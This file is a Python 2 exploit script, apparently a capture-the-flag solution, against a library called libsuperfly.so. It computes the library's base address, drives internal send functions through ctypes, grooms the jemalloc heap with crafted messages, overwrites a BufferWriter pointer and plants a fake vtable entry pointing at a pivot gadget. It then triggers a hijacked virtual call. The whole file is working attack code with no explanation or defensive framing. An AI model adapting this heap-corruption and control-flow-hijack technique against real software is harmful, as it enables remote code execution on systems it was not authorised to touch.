import ctypes, mmap, sys, time
from struct import pack, unpack

# LD_PRELOAD="./libjemalloc.so.2 ./libsuperfly.so" python < exploit.py

DEBUG = False
if DEBUG:
    setup_offset = 0x1d638
    client_cur_off = 0x1e334
    send_msg_off = 0x2594e
else:
    setup_offset = 0x5bc0
    client_cur_off = 0x6320
    send_msg_off = 0x84b0

superfly_base = 0;

superfly = ctypes.cdll.LoadLibrary("libsuperfly.so")
setup_addr = ctypes.cast(superfly.setup, ctypes.c_void_p).value

superfly_base = setup_addr - setup_offset
print "Superfly base {:x}".format(superfly_base)

client_func_addr = superfly_base + client_cur_off
client_func = ctypes.CFUNCTYPE(ctypes.c_void_p)(client_func_addr)

print "Client::current() {:x}".format(client_func_addr)

# Client is also on the heap
client_addr = client_func()

print "TLS client {:x}".format(client_addr)

c_int_p = ctypes.POINTER(ctypes.c_int)
remote_fd = ctypes.cast(client_addr, c_int_p).contents.value

print "Remote FD {:d}".format(remote_fd)

#print "Ret {:d}".format(ret)
libc = ctypes.CDLL("libc.so.6")
NR_memfd_create = 319

send_msg_addr = superfly_base + send_msg_off

print "SendMessage {:x}".format(send_msg_addr)

class iovec(ctypes.Structure):
    _fields_ = [('iov_base', ctypes.c_char_p),
                ('iov_len', ctypes.c_size_t)]


send_msg_func = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_int, 
	ctypes.POINTER(iovec), ctypes.c_size_t, ctypes.c_int)(send_msg_addr)

def write_msg(buf, fd):
    ctypes_buf = ctypes.create_string_buffer(buf, len(buf))
    iov = iovec(iov_base=ctypes.cast(ctypes_buf, ctypes.c_char_p),
        iov_len=len(buf))
    return send_msg_func(remote_fd, iov, 1, fd)

mem_fd = libc.syscall(NR_memfd_create, "/tmp/none", 1)

if mem_fd < 0:
    print "Failed to memfd_create"
    exit(0)

print "Return {:x}".format(mem_fd)

map_len = mmap.PAGESIZE
res = libc.ftruncate(mem_fd, map_len)

if res < 0:
    print "Failed to truncate"
    exit(0)

# Pivot data
mem_fd_mapping = mmap.mmap(mem_fd, map_len, prot = mmap.PROT_READ | mmap.PROT_WRITE, 
    flags = mmap.MAP_SHARED)

pivot_data = pack("<Q", 0xdeadbeef) * 4
mem_fd_mapping.write(pivot_data)
mem_fd_mapping.flush()

heapy = ctypes.create_string_buffer("A", 0x40)
heap_addr = ctypes.addressof(heapy)

print "Heap: {:x}".format(heap_addr)
c_size_t_p = ctypes.POINTER(ctypes.c_size_t)
libc_base = ctypes.cast(ctypes.addressof(libc.syscall), c_size_t_p)[0] -\
    0x11b820
print "libc_base {:x}".format(libc_base)

def AddData(data):
    payload = "\xef\xbe\xad\xde1"+data
    payload = pack("<Q", len(payload))+payload
        
    res = write_msg(payload, -1)

def RemoveData(index):
    payload = "\xef\xbe\xad\xde2"+pack("<Q", index)
    payload = pack("<Q", len(payload))+payload
        
    res = write_msg(payload, -1)

def SetItr():
    payload = "\xef\xbe\xad\xde3"
    payload = pack("<Q", len(payload))+payload

    res = write_msg(payload, -1)

def Memcpy(data):
    payload = "\xef\xbe\xad\xde4"+data
    payload = pack("<Q", len(payload))+payload

    res = write_msg(payload, -1)

def ProcessData(fd, len_):
    payload = "\xef\xbe\xad\xde"+pack("<Q", len_)
    payload = pack("<Q", len(payload))+payload
    
    res = write_msg(payload, fd)

for i in range(20):
    if i == 19:
        data = 'A'*0x50
    else:
        data = 'A'*8
    AddData(data)
    time.sleep(1)

RemoveData(2)

time.sleep(1)

ProcessData(mem_fd, 0x40)

time.sleep(1)



# Realloc into the spot data will also be our vtable
# can't be sized 0x40 or it takes up the malloc region

pivot = superfly_base+0x6393

print "pivot at {:x}".format(pivot)

data = pack("<Q", pivot)
data = data.ljust(0x100, 'A')
AddData(data)
time.sleep(1)

# Overwrite BufferWriter
user_data = (heap_addr & 0xfffffffffff000) + 0x2b200
print "userdata at {:x}".format(user_data)
payload = pack("<Q", user_data)+'A'*0x20
Memcpy(payload)
time.sleep(1)

# Trigger vtable call
ProcessData(mem_fd, 0x1000)

time.sleep(1)

print "Done."
